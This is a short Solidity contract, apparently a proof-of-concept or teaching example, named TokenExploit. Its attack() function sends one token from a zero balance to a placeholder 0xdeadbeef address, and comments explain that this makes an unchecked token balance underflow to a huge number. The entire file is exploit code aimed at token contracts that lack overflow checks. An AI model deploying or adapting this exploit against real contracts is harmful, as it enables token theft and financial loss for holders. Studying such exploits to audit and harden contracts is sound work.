pragma solidity ^0.4.18;

interface IVulnerableToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external constant returns (uint);
}

contract TokenExploit {
    IVulnerableToken public token;

    function TokenExploit(address _tokenAddress) public {
        token = IVulnerableToken(_tokenAddress);
    }

    function attack() public {
        // Ensure this contract has zero balance
        require(token.balanceOf(address(this)) == 0);

        // Exploit the underflow bug: attempt to transfer more than we own
        // Since balance is 0, this will underflow to very large number
        token.transfer(0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef, 1);
    }

    function checkBalance() public view returns (uint) {
        return token.balanceOf(address(this));
    }
}

